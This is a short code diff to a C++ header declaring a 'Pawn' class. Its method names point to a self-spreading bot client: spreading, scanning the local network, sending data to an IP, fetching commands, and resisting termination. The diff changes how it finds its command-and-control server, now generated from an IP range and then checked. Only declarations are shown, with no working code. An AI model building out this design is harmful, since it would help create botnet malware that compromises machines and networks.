@@ -9,6 +9,8 @@
 #include "shared/NetworkOperations.h"
 #include "shared/Helper.h"
 #include "shared/PRNG.h"
+#include <tgmath.h>
+#include <fmt/printf.h>
 
 
 class Pawn {
@@ -26,11 +28,11 @@ public:
     bool spread();
     bool checkSWKill();
     bool sendData2IP();
-    std::string getCC();
+    std::string generateCCIP(std::string lowBound, std::string highBound);
     std::string getCommand();
     std::vector<std::string> discoverLAN();
     void doWork();
-    void connect2CC();
+    bool isRealCC(std::string possibleCC);
     void preventKill();
 };
 
